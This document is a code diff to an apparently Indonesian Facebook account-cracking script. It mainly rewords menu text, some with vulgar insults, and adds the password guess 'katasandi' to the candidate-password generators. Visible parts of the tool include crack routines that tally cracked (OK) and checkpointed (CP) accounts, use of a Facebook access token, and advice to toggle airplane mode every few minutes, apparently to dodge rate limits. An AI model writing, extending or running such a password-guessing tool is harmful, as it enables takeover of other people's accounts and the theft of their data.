@@ -93,12 +93,12 @@ def menu_log():
             xd.write(token)
             xd.close()
             print('%s║'%(O))
-            jalan('%s╚══[%s✓%s] %sLogin Berhasil Ngab....'%(O,H,O,H))
+            jalan('%s╚══[%s✓%s] %sLogin Berhasil Ngab...'%(O,H,O,H))
             #exit(BeautifulSoup.main())
             menu()
         except (KeyError,IOError):
             print('%s║'%(O))
-            jalan('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
+            jalan('%s╚══[%s!%s] %sToken Nya Invalid Kentod !!'%(M,P,M,P))
             os.system('rm -rf token.txt')
             menu_log()
         except requests.exceptions.ConnectionError:
@@ -177,7 +177,7 @@ def menu_log():
         menu_log()
     elif pmu in ['0','00','000','e']:
         jalan('%s╠══[%s!%s] %sTerimakasih Telah Menggunakan Script Ini'%(O,P,O,P))
-        jalan('%s╚══[%s!%s] %sSemoga Harimu Suram...\n'%(O,P,O,P))
+        jalan('%s╚══[%s!%s] %sSemoga Harimu Suram....\n'%(O,P,O,P))
         os.system('rm -rf token.txt')
         clear()
         exit()
@@ -200,7 +200,7 @@ def menu():
         maile = (mailer+'xxxxx@'+mailert2)
         bergabung = wk['joined']
         kadaluarsa = wk['expired']
-        status = ('%sPremium [%sPro%s]'%(O,K,O))
+        status = ('%sPremium [%s Pro %s]'%(O,K,O))
         kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(O,kun[0],P,O,kun[1],P,O))
         pro = ''
         upgrade = 'Ganti License Key'
@@ -212,9 +212,9 @@ def menu():
         kunci = '-'
         bergabung = '-'
         kadaluarsa = '-'
-        pro = ("%s[%sPro%s]"%(O,K,O))
+        pro = ("%s[%s Pro %s]"%(O,K,O))
         upgrade = ('Upgrade To Version %s-'%(O))
-        jid = ('%s[%s5000%s]'%(O,K,O))
+        jid = ('%s[%s 5000 %s]'%(O,K,O))
     try:
         token = open("token.txt","r").read()
         x = requests.get("https://graph.facebook.com/me?access_token=" + token)
@@ -258,7 +258,7 @@ def menu():
     print('%s╠══[%s7%s] %sCek Opsi Akun Checkpoin %s'%(O,K,O,H,pro))
     print('%s╠══[%s8%s] %sSetting User Agent'%(O,K,O,H))
     #print('%s╠══[%s9%s] %s%s'%(O,K,O,H,upgrade))
-    print('%s╠══[%s0%s] %sKeluar \x1b[0;96m[\x1b[0;93mAhh Ngecrot\x1b[0;96m]'%(O,K,O,H))
+    print('%s╠══[%s0%s] %sKeluar \x1b[0;96m[\x1b[0;93m Ahh Ngecrot \x1b[0;96m]'%(O,K,O,H))
     pm = input('%s╠══[%s•%s] %sPilih : '%(O,K,O,P))
     print('%s║'%(O))
     if pm in ['']:
@@ -558,6 +558,7 @@ def generate2(_laura_):
     _aangxd_.append(_laura_.lower())
     _aangxd_.append("kontol")
     _aangxd_.append("sayang")
+    _aangxd_.append("katasandi")
     return _aangxd_
 def generate3(_laura_):
     _aangxd_=[]
@@ -575,6 +576,7 @@ def generate3(_laura_):
     _aangxd_.append(_laura_.lower())
     _aangxd_.append("kontol")
     _aangxd_.append("sayang")
+    _aangxd_.append("katasandi")
     return _aangxd_
 def generate4(_laura_):
     _aangxd_=[]
@@ -1074,7 +1076,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+            print("\r%s[++][%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,fl.get("id"),K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
         except:
             self.api(fl)
     def api_opsi(self,fl):
@@ -1111,7 +1113,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+            print("\r%s[++][%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,fl.get("id"),K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
         except:
             self.api_opsi(fl)
     def mbasic(self,fl):
@@ -1148,7 +1150,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+            print("\r%s[++][%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,fl.get("id"),K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
         except:
             self.mbasic(fl)
     def mbasic_opsi(self,fl):
@@ -1190,7 +1192,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+            print("\r%s[++][%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,fl.get("id"),K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
         except:
             self.mbasic_opsi(fl)
     def free(self,fl):
@@ -1227,7 +1229,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+            print("\r%s[++][%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,fl.get("id"),K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
         except:
             self.free(fl)
     def free_opsi(self,fl):
@@ -1269,7 +1271,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+            print("\r%s[++][%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,fl.get("id"),K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
         except:
             self.free_opsi(fl)
 def target():
@@ -1592,7 +1594,7 @@ def started():
     print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,K,O,H))
     print('%s╠══[%s•%s] %sAkun OK Tersimpan Di OK/%s.txt'%(O,K,O,H,tanggal))
     print('%s╠══[%s•%s] %sAkun CP Tersimpan Di CP/%s.txt'%(O,K,O,H,tanggal))
-    print('%s╚══[%s•%s] %sIngat! \x1b[0;92mMode Pesawatkan \x1b[0;96m[\x1b[0;93m 5 Detik \x1b[0;96m] \x1b[0;92mSetiap 3 Menit\n'%(O,K,O,H))
+    print('%s╚══[%s•%s] %sMode Pesawatkan \x1b[0;96m[\x1b[0;93m 5 Detik \x1b[0;96m] \x1b[0;92mSetiap 3 Menit\n'%(O,K,O,H))
 def folder():
     try:os.mkdir("CP")
     except:pass
